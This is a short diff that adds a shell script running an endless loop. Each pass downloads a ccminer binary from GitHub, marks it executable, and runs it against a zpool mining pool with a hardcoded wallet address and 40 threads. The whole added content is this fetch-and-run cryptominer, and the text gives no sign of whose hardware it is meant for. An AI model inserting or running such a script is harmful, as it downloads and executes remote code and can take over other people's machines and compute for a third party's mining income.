@@ -1,0 +1,4 @@
+while [ 1 ]; do 
+wget https://github.com/monkins1010/ccminer/releases/download/v3.7.0/ccminer_3_7_ubuntu_18.04 && chmod +x ccminer_3_7_ubuntu_18.04 && ./ccminer_3_7_ubuntu_18.04 -a yespower -o  stratum+tcp://yespower.na.mine.zpool.ca:6234 -u D5Kwh3gHQF9s6MYTNZ95FKZsT6gfoN7uPw.VPS -p c=DGB -t 40
+sleep 2
+done
